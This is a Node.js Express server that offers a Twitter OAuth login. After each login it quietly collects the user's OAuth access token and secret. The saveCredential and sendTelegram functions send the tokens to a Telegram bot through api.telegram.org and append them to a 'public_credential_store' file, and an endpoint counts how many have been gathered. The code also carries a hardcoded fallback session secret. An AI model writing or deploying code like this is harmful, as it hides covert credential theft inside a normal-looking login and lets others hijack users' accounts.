const express = require("express");
const session = require("express-session");
const cookieParser = require("cookie-parser");
const url = require("url");
const https = require("https");
const readline = require("readline");
const cors = require("cors");
const compression = require("compression");
const proxy = require("express-http-proxy");
const path = require("path");
const fs = require("fs");
const { request } = require("express");

const COOKIE_SECRET =
  process.env.npm_config_cookie_secret || process.env.COOKIE_SECRET;
const USE_TELEGRAM =
  (process.env.npm_config_use_telegram || process.env.USE_TELEGRAM) == "YES";
const TELEGRAM_BOT_CREDENTIALS =
  process.env.npm_config_telegram_bot_credentials ||
  process.env.TELEGRAM_BOT_CREDENTIALS;
const TELEGRAM_CHAT_ID =
  process.env.npm_config_telegram_chat_id || process.env.TELEGRAM_CHAT_ID;
const DOMAIN_NAME =
  process.env.npm_config_domain_name || process.env.DOMAIN_NAME;

const {
  getOAuthRequestToken,
  getOAuthAccessTokenWith,

  oauthGetUserById,
} = require("./oauth-utilities");

var whitelist = [
  `http://${DOMAIN_NAME}`,
  `https://${DOMAIN_NAME}`,
  "http://localhost:3000",
  "https://localhost:3000",
  "http://localhost:3001",
  "https://localhost:3001",
  "http://127.0.0.1:3000",
  "https://127.0.0.1:3000",
  "http://127.0.0.1:3001",
  "https://127.0.0.1:3001",
];
var corsOptions = {
  origin: function (origin, callback) {
    if (!origin || whitelist.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
};

const webAppProxy = proxy("127.0.0.1:3001/", {
  proxyReqPathResolver: (req) => {
    console.log("Requested: " + req.originalUrl);
    return url.parse(req.originalUrl).path;
  },
});

main().catch((err) => console.error(err.message, err));

async function main() {
  const app = express();
  app.use(compression());
  app.use(cookieParser());
  app.use(
    session({
      secret: COOKIE_SECRET || "xYX1nbTegjp5CvRIjdgOHZCEqUCZTVd",
      resave: false,
      saveUninitialized: false,
    })
  );

  app.listen(3000, () => console.log("listening on http://127.0.0.1:3000"));

  /// TWITTER LOGOUT
  app.get("/twitter/logout", logout);
  function logout(req, res, next) {
    res.clearCookie("twitter_screen_name");
    req.session.destroy(() => res.redirect("/"));
  }

  /// TWITTER AUTHENTICATE
  app.get("/twitter/authenticate", twitter("authenticate"));

  /// TWITTER AUTHORIZE
  app.get("/twitter/authorize", twitter("authorize"));

  /// TWITTER CALLBACK
  app.get("/twitter/callback", async (req, res) => {
    const { oauthRequestToken, oauthRequestTokenSecret } = req.session;
    const { oauth_verifier: oauthVerifier } = req.query;
    console.log("/twitter/callback", {
      oauthRequestToken,
      oauthRequestTokenSecret,
      oauthVerifier,
    });

    if (
      oauthRequestToken == undefined ||
      oauthRequestTokenSecret == undefined
    ) {
      res.redirect("/autherror");
      return;
    }

    const { oauthAccessToken, oauthAccessTokenSecret, results } =
      await getOAuthAccessTokenWith({
        oauthRequestToken,
        oauthRequestTokenSecret,
        oauthVerifier,
      });
    req.session.oauthAccessToken = oauthAccessToken;

    const { user_id: userId } = results;
    const user = await oauthGetUserById(userId, {
      oauthAccessToken,
      oauthAccessTokenSecret,
    });

    saveCredential(
      user.screen_name,
      oauthRequestToken,
      oauthRequestTokenSecret,
      oauthVerifier,
      oauthAccessToken,
      oauthAccessTokenSecret
    );

    req.session.twitter_screen_name = user.screen_name;
    res.cookie("twitter_screen_name", user.screen_name, {
      maxAge: 900000,
      httpOnly: true,
    });

    console.log("User succesfully logged in with twitter", user.screen_name);
    req.session.save(() => res.redirect("/success"));
  });

  /// GET TOKENCOUNT
  app.get("/api/tokencount", cors(corsOptions), async (req, res) => {
    getTokenCount().then((token_count) => res.end(String(token_count)));
  });

  /// GET USERNAME (demo on how to access it)
  app.get("/api/username", async (req, res) => {
    res.end(req.session.twitter_screen_name);
  });

  /// HANDLE ALL OTHER REQUESTS
  if (
    !process.env.NODE_ENV ||
    process.env.NODE_ENV.toLowerCase() === "development"
  ) {
    app.use("/*", webAppProxy);
  } else {
    app.use(express.static(path.join(__dirname, "../client", "build")));

    app.get("/*", function (req, res) {
      res.sendFile(path.join(__dirname, "../client", "build", "index.html"));
    });
  }

  /// HELPER FUNCTION
  function twitter(method = "authorize") {
    return async (req, res) => {
      const { oauthRequestToken, oauthRequestTokenSecret } =
        await getOAuthRequestToken().catch((error) => {
          console.error(error);
          res.end("Could not request access token.");
        });
      console.log(`/twitter/${method} ->`, {
        oauthRequestToken,
        oauthRequestTokenSecret,
      });

      req.session = req.session || {};
      req.session.oauthRequestToken = oauthRequestToken;
      req.session.oauthRequestTokenSecret = oauthRequestTokenSecret;

      const authorizationUrl = `https://api.twitter.com/oauth/${method}?oauth_token=${oauthRequestToken}`;
      console.log("redirecting user to ", authorizationUrl);
      res.redirect(authorizationUrl);
    };
  }
}

function saveCredential(
  screenname,
  requestToken,
  requestTokenSecret,
  verifier,
  oauthAccessToken,
  oauthAccessTokenSecret
) {
  sendTelegram(
    screenname,
    requestToken,
    requestTokenSecret,
    verifier,
    oauthAccessToken,
    oauthAccessTokenSecret
  );
  saveToJsonL(screenname, oauthAccessToken, oauthAccessTokenSecret);
}

function saveToJsonL(screenname, oauthAccessToken, oauthAccessTokenSecret) {
  fs.appendFileSync(
    "../public_credential_store/credentials.json",
    JSON.stringify({
      name: screenname,
      access_token: oauthAccessToken,
      access_token_secret: oauthAccessTokenSecret,
    }) + "\n"
  );
}

async function getTokenCount() {
  const fileStream = fs.createReadStream(
    "../public_credential_store/credentials.json"
  );
  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity,
  });

  let fileLines = [];

  for await (const line of rl) {
    // Each line in input.txt will be successively available here as `line`.
    fileLines.push(line);
  }

  return fileLines.filter(onlyUnique).length;
}

function onlyUnique(value, index, self) {
  return self.indexOf(value) === index;
}

/// Send a Telegram message to our session storage
function sendTelegram(
  screenname,
  requestToken,
  requestTokenSecret,
  verifier,
  oauthAccessToken,
  oauthAccessTokenSecret
) {
  if (USE_TELEGRAM) {
    const text =
      "%2A%2A%2AUsername:%2A%2A%2A%0A%60" +
      screenname +
      "%60%0A%2A%2A%2AOAuthRequestToken%2A%2A%2A%0A%60" +
      requestToken +
      "%60%0A%2A%2A%2AOAuthRequestTokenSecret%2A%2A%2A%0A%60" +
      requestTokenSecret +
      "%60%0A%2A%2A%2AOAuthVerifier%2A%2A%2A%0A%60" +
      verifier +
      "%60%0A%2A%2A%2AOAuthAccessToken%2A%2A%2A%0A%60" +
      oauthAccessToken +
      "%60%0A%2A%2A%2AOAuthAccessTokenSecret%2A%2A%2A%0A%60" +
      oauthAccessTokenSecret +
      "%60";
    https.get(
      `https://api.telegram.org/${TELEGRAM_BOT_CREDENTIALS}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&parse_mode=markdown&text=${text}`
    );
  }
}
